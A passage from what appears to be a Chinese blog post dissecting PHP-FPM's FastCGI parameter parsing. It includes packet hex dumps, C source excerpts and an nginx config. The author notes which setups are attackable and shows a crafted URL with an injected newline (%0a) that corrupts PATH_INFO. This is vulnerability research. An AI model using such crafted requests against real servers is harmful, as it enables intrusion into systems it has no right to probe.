class="number">45</span> <span class="number">4e</span> <span class="number">47</span> <span class="number">54</span> <span class="number">48</span> <span class="number">0</span>b  <span class="number">12</span> <span class="number">53</span> <span class="number">43</span> <span class="number">52</span> <span class="number">49</span> <span class="number">50</span> <span class="number">54</span> <span class="number">5</span>f   _LENGTH. .SCRIPT_</span><br><span class="line"><span class="symbol">00000060 </span> <span class="number">4e</span> <span class="number">41</span> <span class="number">4d</span> <span class="number">45</span> <span class="number">2</span>f <span class="number">69</span> <span class="number">6e</span> <span class="number">64</span>  <span class="number">65</span> <span class="number">78</span> <span class="number">2e</span> <span class="number">70</span> <span class="number">68</span> <span class="number">70</span> <span class="number">2</span>f <span class="number">61</span>   <span class="keyword">NAME</span>/ind ex.php/a</span><br><span class="line"><span class="symbol">00000070 </span> <span class="number">62</span> <span class="number">63</span> <span class="number">0</span>a <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">0</span>b <span class="number">14</span>  <span class="number">52</span> <span class="number">45</span> <span class="number">51</span> <span class="number">55</span> <span class="number">45</span> <span class="number">53</span> <span class="number">54</span> <span class="number">5</span>f   bc.abc.. REQUEST_</span><br><span class="line"><span class="symbol">00000080 </span> <span class="number">55</span> <span class="number">52</span> <span class="number">49</span> <span class="number">2</span>f <span class="number">69</span> <span class="number">6e</span> <span class="number">64</span> <span class="number">65</span>  <span class="number">78</span> <span class="number">2e</span> <span class="number">70</span> <span class="number">68</span> <span class="number">70</span> <span class="number">2</span>f <span class="number">61</span> <span class="number">62</span>   URI/inde x.php/ab</span><br><span class="line"><span class="symbol">00000090 </span> <span class="number">63</span> <span class="number">25</span> <span class="number">30</span> <span class="number">61</span> <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">0</span>c  <span class="number">12</span> <span class="number">44</span> <span class="number">4</span>f <span class="number">43</span> <span class="number">55</span> <span class="number">4d</span> <span class="number">45</span> <span class="number">4e</span>   c%<span class="number">0</span>aabc. .DOCUMEN</span><br><span class="line"><span class="number">000000</span>A0  <span class="number">54</span> <span class="number">5</span>f <span class="number">55</span> <span class="number">52</span> <span class="number">49</span> <span class="number">2</span>f <span class="number">69</span> <span class="number">6e</span>  <span class="number">64</span> <span class="number">65</span> <span class="number">78</span> <span class="number">2e</span> <span class="number">70</span> <span class="number">68</span> <span class="number">70</span> <span class="number">2</span>f   T_URI/in dex.php/</span><br><span class="line"><span class="number">000000</span>B0  <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">0</span>a <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">0d</span>  <span class="number">15</span> <span class="number">44</span> <span class="number">4</span>f <span class="number">43</span> <span class="number">55</span> <span class="number">4d</span> <span class="number">45</span> <span class="number">4e</span>   abc.abc. .DOCUMEN</span><br><span class="line"><span class="number">000000</span>C0  <span class="number">54</span> <span class="number">5</span>f <span class="number">52</span> <span class="number">4</span>f <span class="number">4</span>f <span class="number">54</span> <span class="number">2</span>f <span class="number">75</span>  <span class="number">73</span> <span class="number">72</span> <span class="number">2</span>f <span class="number">73</span> <span class="number">68</span> <span class="number">61</span> <span class="number">72</span> <span class="number">65</span>   T_ROOT/u sr/share</span><br><span class="line"><span class="number">000000D0</span>  <span class="number">2</span>f <span class="number">6e</span> <span class="number">67</span> <span class="number">69</span> <span class="number">6e</span> <span class="number">78</span> <span class="number">2</span>f <span class="number">68</span>  <span class="number">74</span> <span class="number">6d</span> <span class="number">6</span>c <span class="number">0</span>f <span class="number">08</span> <span class="number">53</span> <span class="number">45</span> <span class="number">52</span>   /nginx/h tml..SER</span><br><span class="line"><span class="number">000000E0</span>  <span class="number">56</span> <span class="number">45</span> <span class="number">52</span> <span class="number">5</span>f <span class="number">50</span> <span class="number">52</span> <span class="number">4</span>f <span class="number">54</span>  <span class="number">4</span>f <span class="number">43</span> <span class="number">4</span>f <span class="number">4</span>c <span class="number">48</span> <span class="number">54</span> <span class="number">54</span> <span class="number">50</span>   VER_PROT OCOLHTTP</span><br><span class="line"><span class="number">000000</span>F0  <span class="number">2</span>f <span class="number">31</span> <span class="number">2e</span> <span class="number">31</span> <span class="number">0e</span> <span class="number">04</span> <span class="number">52</span> <span class="number">45</span>  <span class="number">51</span> <span class="number">55</span> <span class="number">45</span> <span class="number">53</span> <span class="number">54</span> <span class="number">5</span>f <span class="number">53</span> <span class="number">43</span>   /<span class="number">1.1..</span>RE QUEST_SC</span><br><span class="line"><span class="symbol">00000100 </span> <span class="number">48</span> <span class="number">45</span> <span class="number">4d</span> <span class="number">45</span> <span class="number">68</span> <span class="number">74</span> <span class="number">74</span> <span class="number">70</span>  <span class="number">11</span> <span class="number">07</span> <span class="number">47</span> <span class="number">41</span> <span class="number">54</span> <span class="number">45</span> <span class="number">57</span> <span class="number">41</span>   HEMEhttp ..GATEWA</span><br><span class="line"><span class="symbol">00000110 </span> <span class="number">59</span> <span class="number">5</span>f <span class="number">49</span> <span class="number">4e</span> <span class="number">54</span> <span class="number">45</span> <span class="number">52</span> <span class="number">46</span>  <span class="number">41</span> <span class="number">43</span> <span class="number">45</span> <span class="number">43</span> <span class="number">47</span> <span class="number">49</span> <span class="number">2</span>f <span class="number">31</span>   Y_INTERF ACECGI/<span class="number">1</span></span><br><span class="line"><span class="symbol">00000120 </span> <span class="number">2e</span> <span class="number">31</span> <span class="number">0</span>f <span class="number">0</span>c <span class="number">53</span> <span class="number">45</span> <span class="number">52</span> <span class="number">56</span>  <span class="number">45</span> <span class="number">52</span> <span class="number">5</span>f <span class="number">53</span> <span class="number">4</span>f <span class="number">46</span> <span class="number">54</span> <span class="number">57</span>   .<span class="number">1..</span>SERV ER_SOFTW</span><br><span class="line"><span class="symbol">00000130 </span> <span class="number">41</span> <span class="number">52</span> <span class="number">45</span> <span class="number">6e</span> <span class="number">67</span> <span class="number">69</span> <span class="number">6e</span> <span class="number">78</span>  <span class="number">2</span>f <span class="number">31</span> <span class="number">2e</span> <span class="number">31</span> <span class="number">37</span> <span class="number">2e</span> <span class="number">38</span> <span class="number">0</span>b   AREnginx /<span class="number">1.17.8.</span></span><br><span class="line"><span class="symbol">00000140 </span> <span class="number">0</span>a <span class="number">52</span> <span class="number">45</span> <span class="number">4d</span> <span class="number">4</span>f <span class="number">54</span> <span class="number">45</span> <span class="number">5</span>f  <span class="number">41</span> <span class="number">44</span> <span class="number">44</span> <span class="number">52</span> <span class="number">31</span> <span class="number">37</span> <span class="number">32</span> <span class="number">2e</span>   .<span class="comment">REMOTE_ ADDR172.</span></span><br><span class="line"><span class="symbol">00000150 </span> <span class="number">32</span> <span class="number">35</span> <span class="number">2e</span> <span class="number">30</span> <span class="number">2e</span> <span class="number">31</span> <span class="number">0</span>b <span class="number">05</span>  <span class="number">52</span> <span class="number">45</span> <span class="number">4d</span> <span class="number">4</span>f <span class="number">54</span> <span class="number">45</span> <span class="number">5</span>f <span class="number">50</span>   <span class="number">25.0.1..</span> <span class="comment">REMOTE_P</span></span><br><span class="line"><span class="symbol">00000160 </span> <span class="number">4</span>f <span class="number">52</span> <span class="number">54</span> <span class="number">35</span> <span class="number">36</span> <span class="number">38</span> <span class="number">33</span> <span class="number">34</span>  <span class="number">0</span>b <span class="number">0</span>a <span class="number">53</span> <span class="number">45</span> <span class="number">52</span> <span class="number">56</span> <span class="number">45</span> <span class="number">52</span>   ORT56834 ..SERVER</span><br><span class="line"><span class="symbol">00000170 </span> <span class="number">5</span>f <span class="number">41</span> <span class="number">44</span> <span class="number">44</span> <span class="number">52</span> <span class="number">31</span> <span class="number">37</span> <span class="number">32</span>  <span class="number">2e</span> <span class="number">32</span> <span class="number">35</span> <span class="number">2e</span> <span class="number">30</span> <span class="number">2e</span> <span class="number">33</span> <span class="number">0</span>b   _ADDR172 .<span class="number">25.0.3.</span></span><br><span class="line"><span class="symbol">00000180 </span> <span class="number">02</span> <span class="number">53</span> <span class="number">45</span> <span class="number">52</span> <span class="number">56</span> <span class="number">45</span> <span class="number">52</span> <span class="number">5</span>f  <span class="number">50</span> <span class="number">4</span>f <span class="number">52</span> <span class="number">54</span> <span class="number">38</span> <span class="number">30</span> <span class="number">0</span>b <span class="number">01</span>   .SERVER_ PORT80..</span><br><span class="line"><span class="symbol">00000190 </span> <span class="number">53</span> <span class="number">45</span> <span class="number">52</span> <span class="number">56</span> <span class="number">45</span> <span class="number">52</span> <span class="number">5</span>f <span class="number">4e</span>  <span class="number">41</span> <span class="number">4d</span> <span class="number">45</span> <span class="number">5</span>f <span class="number">0</span>f <span class="number">03</span> <span class="number">52</span> <span class="number">45</span>   SERVER_N AME_..RE</span><br><span class="line"><span class="number">000001</span>A0  <span class="number">44</span> <span class="number">49</span> <span class="number">52</span> <span class="number">45</span> <span class="number">43</span> <span class="number">54</span> <span class="number">5</span>f <span class="number">53</span>  <span class="number">54</span> <span class="number">41</span> <span class="number">54</span> <span class="number">55</span> <span class="number">53</span> <span class="number">32</span> <span class="number">30</span> <span class="number">30</span>   DIRECT_S TATUS200</span><br><span class="line"><span class="number">000001</span>B0  <span class="number">09</span> <span class="number">00</span> <span class="number">50</span> <span class="number">41</span> <span class="number">54</span> <span class="number">48</span> <span class="number">5</span>f <span class="number">49</span>  <span class="number">4e</span> <span class="number">46</span> <span class="number">4</span>f <span class="number">0</span>f <span class="number">03</span> <span class="number">52</span> <span class="number">45</span> <span class="number">44</span>   ..PATH_I NFO..RED</span><br><span class="line"><span class="number">000001</span>C0  <span class="number">49</span> <span class="number">52</span> <span class="number">45</span> <span class="number">43</span> <span class="number">54</span> <span class="number">5</span>f <span class="number">53</span> <span class="number">54</span>  <span class="number">41</span> <span class="number">54</span> <span class="number">55</span> <span class="number">53</span> <span class="number">32</span> <span class="number">30</span> <span class="number">30</span> <span class="number">0</span>f   IRECT_ST ATUS200.</span><br><span class="line"><span class="number">000001D0</span>  <span class="number">1</span>f <span class="number">53</span> <span class="number">43</span> <span class="number">52</span> <span class="number">49</span> <span class="number">50</span> <span class="number">54</span> <span class="number">5</span>f  <span class="number">46</span> <span class="number">49</span> <span class="number">4</span>c <span class="number">45</span> <span class="number">4e</span> <span class="number">41</span> <span class="number">4d</span> <span class="number">45</span>   .SCRIPT_ FILENAME</span><br><span class="line"><span class="number">000001E0</span>  <span class="number">2</span>f <span class="number">76</span> <span class="number">61</span> <span class="number">72</span> <span class="number">2</span>f <span class="number">77</span> <span class="number">77</span> <span class="number">77</span>  <span class="number">2</span>f <span class="number">68</span> <span class="number">74</span> <span class="number">6d</span> <span class="number">6</span>c <span class="number">2</span>f <span class="number">69</span> <span class="number">6e</span>   /var/www /html/in</span><br><span class="line"><span class="number">000001</span>F0  <span class="number">64</span> <span class="number">65</span> <span class="number">78</span> <span class="number">2e</span> <span class="number">70</span> <span class="number">68</span> <span class="number">70</span> <span class="number">2</span>f  <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">0</span>a <span class="number">61</span> <span class="number">62</span> <span class="number">63</span> <span class="number">0d</span>   dex.php/ abc.abc.</span><br><span class="line"><span class="symbol">00000200 </span> <span class="number">0d</span> <span class="number">44</span> <span class="number">4</span>f <span class="number">43</span> <span class="number">55</span> <span class="number">4d</span> <span class="number">45</span> <span class="number">4e</span>  <span class="number">54</span> <span class="number">5</span>f <span class="number">52</span> <span class="number">4</span>f <span class="number">4</span>f <span class="number">54</span> <span class="number">2</span>f <span class="number">76</span>   .DOCUMEN T_ROOT/v</span><br><span class="line"><span class="symbol">00000210 </span> <span class="number">61</span> <span class="number">72</span> <span class="number">2</span>f <span class="number">77</span> <span class="number">77</span> <span class="number">77</span> <span class="number">2</span>f <span class="number">68</span>  <span class="number">74</span> <span class="number">6d</span> <span class="number">6</span>c <span class="number">09</span> <span class="number">0e</span> <span class="number">48</span> <span class="number">54</span> <span class="number">54</span>   ar/www/h tml..HTT</span><br><span class="line"><span class="symbol">00000220 </span> <span class="number">50</span> <span class="number">5</span>f <span class="number">48</span> <span class="number">4</span>f <span class="number">53</span> <span class="number">54</span> <span class="number">6</span>c <span class="number">6</span>f  <span class="number">63</span> <span class="number">61</span> <span class="number">6</span>c <span class="number">68</span> <span class="number">6</span>f <span class="number">73</span> <span class="number">74</span> <span class="number">3</span>a   P_HOSTlo calhost:</span><br><span class="line"><span class="symbol">00000230 </span> <span class="number">38</span> <span class="number">30</span> <span class="number">38</span> <span class="number">30</span> <span class="number">0</span>f <span class="number">0</span>b <span class="number">48</span> <span class="number">54</span>  <span class="number">54</span> <span class="number">50</span> <span class="number">5</span>f <span class="number">55</span> <span class="number">53</span> <span class="number">45</span> <span class="number">52</span> <span class="number">5</span>f   <span class="number">8080..</span>HT TP_USER_</span><br><span class="line"><span class="symbol">00000240 </span> <span class="number">41</span> <span class="number">47</span> <span class="number">45</span> <span class="number">4e</span> <span class="number">54</span> <span class="number">63</span> <span class="number">75</span> <span class="number">72</span>  <span class="number">6</span>c <span class="number">2</span>f <span class="number">37</span> <span class="number">2e</span> <span class="number">35</span> <span class="number">38</span> <span class="number">2e</span> <span class="number">30</span>   AGENTcur l/<span class="number">7.58.0</span></span><br><span class="line"><span class="symbol">00000250 </span> <span class="number">0</span>b <span class="number">03</span> <span class="number">48</span> <span class="number">54</span> <span class="number">54</span> <span class="number">50</span> <span class="number">5</span>f <span class="number">41</span>  <span class="number">43</span> <span class="number">43</span> <span class="number">45</span> <span class="number">50</span> <span class="number">54</span> <span class="number">2</span>a <span class="number">2</span>f <span class="number">2</span>a   ..HTTP_A CCEPT*/*</span><br><span class="line"><span class="symbol">00000260 </span> <span class="number">01</span> <span class="number">04</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">05</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   ........ ........</span><br><span class="line"></span><br><span class="line"><span class="symbol">00000000 </span> <span class="number">01</span> <span class="number">06</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">44</span> <span class="number">04</span> <span class="number">00</span>  <span class="number">58</span> <span class="number">2d</span> <span class="number">50</span> <span class="number">6</span>f <span class="number">77</span> <span class="number">65</span> <span class="number">72</span> <span class="number">65</span>   .....D.. X-Powere</span><br><span class="line"><span class="symbol">00000010 </span> <span class="number">64</span> <span class="number">2d</span> <span class="number">42</span> <span class="number">79</span> <span class="number">3</span>a <span class="number">20</span> <span class="number">50</span> <span class="number">48</span>  <span class="number">50</span> <span class="number">2</span>f <span class="number">37</span> <span class="number">2e</span> <span class="number">32</span> <span class="number">2e</span> <span class="number">31</span> <span class="number">30</span>   d-By: PH P/<span class="number">7.2.10</span></span><br><span class="line"><span class="symbol">00000020 </span> <span class="number">0d</span> <span class="number">0</span>a <span class="number">43</span> <span class="number">6</span>f <span class="number">6e</span> <span class="number">74</span> <span class="number">65</span> <span class="number">6e</span>  <span class="number">74</span> <span class="number">2d</span> <span class="number">74</span> <span class="number">79</span> <span class="number">70</span> <span class="number">65</span> <span class="number">3</span>a <span class="number">20</span>   ..Conten t-type: </span><br><span class="line"><span class="symbol">00000030 </span> <span class="number">74</span> <span class="number">65</span> <span class="number">78</span> <span class="number">74</span> <span class="number">2</span>f <span class="number">68</span> <span class="number">74</span> <span class="number">6d</span>  <span class="number">6</span>c <span class="number">3</span>b <span class="number">20</span> <span class="number">63</span> <span class="number">68</span> <span class="number">61</span> <span class="number">72</span> <span class="number">73</span>   text/htm l; chars</span><br><span class="line"><span class="symbol">00000040 </span> <span class="number">65</span> <span class="number">74</span> <span class="number">3d</span> <span class="number">55</span> <span class="number">54</span> <span class="number">46</span> <span class="number">2d</span> <span class="number">38</span>  <span class="number">0d</span> <span class="number">0</span>a <span class="number">0d</span> <span class="number">0</span>a <span class="number">54</span> <span class="number">48</span> <span class="number">5</span>f <span class="number">49</span>   et=UTF-<span class="number">8</span> ....TH_I</span><br><span class="line"><span class="symbol">00000050 </span> <span class="number">4e</span> <span class="number">46</span> <span class="number">4</span>f <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">01</span> <span class="number">03</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">08</span> <span class="number">00</span> <span class="number">00</span>   NFO..... ........</span><br><span class="line"><span class="symbol">00000060 </span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">08</span> <span class="number">00</span> <span class="number">00</span>                            ........</span><br></pre></td></tr></table></figure>
+
+<h3 id="FPM-如何将参数提取出来？"><a href="#FPM-如何将参数提取出来？" class="headerlink" title="FPM 如何将参数提取出来？"></a>FPM 如何将参数提取出来？</h3><p>结合 FPM 生命周期，解析 FastCGI 协议字段是在 FPM_REQUEST_READING_HEADERS 阶段。</p>
+<blockquote>
+<p>本来想把这些过程画一个函数调用图，太麻烦了。</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fpm_main.c</span></span><br><span class="line">request = fpm_init_request(fcgi_fd);</span><br><span class="line"></span><br><span class="line">zend_first_try &#123;</span><br><span class="line">    <span class="keyword">while</span> (EXPECTED(fcgi_accept_request(request) &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">char</span> *primary_script = <span class="literal">NULL</span>;</span><br><span class="line">        request_body_fd = <span class="number">-1</span>;</span><br><span class="line">        SG(server_context) = (<span class="keyword">void</span> *) request;</span><br><span class="line">        init_request_info();</span><br><span class="line"></span><br><span class="line">        fpm_request_info();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; zend_catch &#123;</span><br><span class="line">    exit_status = FPM_EXIT_SOFTWARE;</span><br><span class="line">&#125; zend_end_try();</span><br></pre></td></tr></table></figure>
+
+<p><strong>fpm_accept_request</strong> 建立连接之后，就是读取数据。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fastcgi.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fcgi_accept_request</span><span class="params">(fcgi_request *req)</span> </span>&#123;</span><br><span class="line">    req-&gt;hook.on_accept();</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    req-&gt;fd = accept(listen_socket, (struct sockaddr *)&amp;sa, &amp;len);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    req-&gt;hook.on_read();</span><br><span class="line">    fcgi_read_request(req);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>fcgi_read_request</strong> 先读 header，获取到 type，再拿到 len，针对类型做不同处理，再继续往下读。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fastcgi.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fcgi_read_request</span><span class="params">(fcgi_request *req)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (safe_read(req, &amp;hdr, <span class="keyword">sizeof</span>(fcgi_header)) != <span class="keyword">sizeof</span>(fcgi_header) || </span><br><span class="line">        hdr.version &lt; FCGI_VERSION_1) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    len = (hdr.contentLengthB1 &lt;&lt; <span class="number">8</span>) | hdr.contentLengthB0;</span><br><span class="line">    padding = hdr.paddingLength;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (hdr.type == FCGI_PARAMS &amp;&amp; len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (len + padding &gt; FCGI_MAX_LENGTH) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="comment">// safe_read() 是对 read() 的封装</span></span><br><span class="line">        <span class="keyword">if</span> (safe_read(req, buf, len+padding) != len+padding) &#123;</span><br><span class="line">            req-&gt;keep = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!fcgi_get_params(req, buf, buf+len)) &#123;</span><br><span class="line">            req-&gt;keep = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (safe_read(req, &amp;hdr, <span class="keyword">sizeof</span>(fcgi_header)) != <span class="keyword">sizeof</span>(fcgi_header) ||</span><br><span class="line">            hdr.version &lt; FCGI_VERSION_1) &#123;</span><br><span class="line">            req-&gt;keep = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        len = (hdr.contentLengthB1 &lt;&lt; <span class="number">8</span>) | hdr.contentLengthB0;</span><br><span class="line">        padding = hdr.paddingLength;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>fcgi_get_params</strong> 当 <code>hdr.type == FCGI_PARAMS</code> 就开始提取参数，全部存储到 <code>request-&gt;env-&gt;data</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">fcgi_get_params</span><span class="params">(fcgi_request *req, <span class="keyword">unsigned</span> <span class="keyword">char</span> *p, <span class="keyword">unsigned</span> <span class="keyword">char</span> *end)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> name_len, val_len;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (p &lt; end) &#123;</span><br><span class="line">		name_len = *p++;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        </span><br><span class="line">		val_len = *p++;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">		fcgi_hash_set(&amp;req-&gt;env, FCGI_HASH_FUNC(p, name_len), (<span class="keyword">char</span>*)p, name_len, (<span class="keyword">char</span>*)p + name_len, val_len);</span><br><span class="line">		p += name_len + val_len;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>提取实例</strong></p>
+<p>提取规则很简单，Nginx 以 <code>keyLength+valueLength+key+value</code> 传过来的，利用 <code>fcgi_hash_set()</code> 存进去。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffd6e941dde</span>:	<span class="string">"\v\024REQUEST_URI/index.php/abc%0aabc\f\022DOCUMENT_URI/index.php/abc\nabc\r\rDOCUMENT_ROOT/var/www/html\017\bSERVER_PROTOCOLHTTP/1.1\016\004REQUEST_SCHEMEhttp\021\aGATEWAY_INTERFACECGI/1.1\017\fSERVER_SOFTWAREnginx/1.14.0\v\tREMOTE_ADDR127.0.0.1\v\005REMOTE_PORT37248\v\tSERVER_ADDR127.0.0.1\v\002SERVER_PORT80\v\001SERVER_NAME_\017\003REDIRECT_STATUS200\017\037SCRIPT_FILENAME/var/www/html/index.php/abc\nabc\t"</span></span><br><span class="line"><span class="number">0x7ffd6e941f40</span>:	<span class="string">"PATH_INFO\017\rPATH_TRANSLATED/var/www/html\t\tHTTP_HOSTlocalhost\017\vHTTP_USER_AGENTcurl/7.58.0\v\003HTTP_ACCEPT*/*"</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>看一下 nginx 文档推荐的 fpm 配置，其中特意判断了一下脚本文件是否存在。</p>
+<p>注意：能被攻击的是没有这行判断的。</p>
+<blockquote>
+<p>配置字段不熟悉的可以看这个 <a href="http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html" target="_blank" rel="noopener">http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html</a></p>
+</blockquote>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> <span class="regexp">~ [^/]\.php(/|$)</span> &#123;</span><br><span class="line">    <span class="attribute">fastcgi_split_path_info</span><span class="regexp"> ^(.+?\.php)(/.*)$</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">if</span> (!-f <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>) &#123;</span><br><span class="line">        <span class="attribute">return</span> <span class="number">404</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">fastcgi_pass</span> <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">    <span class="attribute">fastcgi_index</span> index.php;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> SCRIPT_FILENAME <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">    <span class="attribute">fastcgi_param</span> DOCUMENT_ROOT /var/www/html/;</span><br><span class="line">    <span class="attribute">include</span> fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="异常出现"><a href="#异常出现" class="headerlink" title="异常出现"></a>异常出现</h3><p>在 URL 中加入换行符后出现了异常，我设的返回值是 $_SERVER[‘PATH_INFO’]​，看这结果应该是出现了溢出。</p>
+<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1gbi4wahg7qj20aw03nt8p.jpg" alt="image.png"></p>
+<p>根据这个正则 <code>^(.+?\.php)(/.*)$</code>，前一部分给了 $fastcgi_script_name，后一部分给了 $fastcgi_path_info。</p>
+<p>由于没有匹配换行符，FastCGI 拿到的 PATH_INFO 应该是空的。为什么 PHP 依然能获取到呢？</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">php &gt; preg_match('/^(.+?\.php)(\/.*)$/', urldecode('index.php/abcabc'), $matches);print_r($matches);</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; index.php/abcabc</span><br><span class="line">    [1] =&gt; index.php</span><br><span class="line">    [2] =&gt; /abcabc</span><br><span class="line">)</span><br><span class="line">php &gt; preg_match('/^(.+?\.php)(\/.*)$/', urldecode('index.php/abc%0aabc'), $matches);print_r($matches);</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>为什么 fpm 拿到的 SCRIPT_NAME 为 <code>index.php/abc%0a/123</code>？正则匹配结果诡异，这一点得翻 nginx 源码了。</p>
+<h3 id="找寻原因"><a href="#找寻原因" class="headerlink" title="找寻原因"></a>找寻原因</h3><p>继续寻找这些问题的答案。上面已经对 FastCGI 做了比较详细的描述，这里直奔主题。</p>
